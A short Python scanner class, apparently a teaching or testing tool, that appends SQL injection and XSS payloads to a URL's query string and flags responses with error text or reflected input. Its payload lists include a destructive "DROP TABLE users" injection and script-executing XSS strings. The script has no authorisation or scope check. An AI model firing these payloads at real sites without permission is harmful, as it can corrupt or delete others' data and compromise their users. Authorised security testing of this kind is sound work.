import requests

class PenetrationTester:
    def __init__(self):
        self.test_results = ""  # Store the results of the tests

    def test_website(self, url):
        print(f"\nTesting website: {url}")
        # Run SQL Injection and XSS tests
        self.test_results = self._check_sql_injection(url) + "\n" + self._check_xss(url)
        print(self.test_results)

    def _check_sql_injection(self, url):
        results = "=== SQL Injection Test ===\n"
        # Common SQL Injection payloads to test
        payloads = [
            "' OR '1'='1",  # Basic SQL Injection
            "' OR '1'='1' --",  # SQL Injection with comment
            "' UNION SELECT null, null, null --",  # Union based SQL Injection
            "' OR 1=1; DROP TABLE users --"  # Dangerous SQL Injection
        ]
        vulnerable = False  # Flag to track if a vulnerability is found
        for payload in payloads:
            test_url = f"{url}?id={payload}"  # Append payload to the URL
            try:
                response = requests.get(test_url) # Send GET request with payload
                # Check if the response contains SQL errors
                if "error" in response.text.lower() or "syntax" in response.text.lower():
                    results += f"Potential SQL Injection vulnerability found with payload: {payload}\n"
                    vulnerable = True
            except Exception as e:
                results += f"Error testing payload {payload}: {e}\n"
        if not vulnerable:
            results += "No SQL Injection vulnerabilities detected.\n"
        return results

    def _check_xss(self, url):
        results = "=== XSS Test ===\n"
        # Common XSS payloads to test
        payloads = [
            "<script>alert('XSS')</script>",  # Basic XSS
            "<img src=x onerror=alert('XSS')>",  # XSS using img tag
            "<svg/onload=alert('XSS')>"  # XSS using SVG tag
        ]
        vulnerable = False  # Flag to track if any vulnerability is found
        for payload in payloads:
            test_url = f"{url}?search={payload}"  # Append payload to the URL
            try:
                response = requests.get(test_url)  # Send GET request with payload
                # Check if the payload is reflected in the response
                if payload in response.text:
                    results += f"Potential XSS vulnerability found with payload: {payload}\n"
                    vulnerable = True
            except Exception as e:
                results += f"Error testing payload {payload}: {e}\n"
        if not vulnerable:
            results += "No XSS vulnerabilities detected.\n"
        return results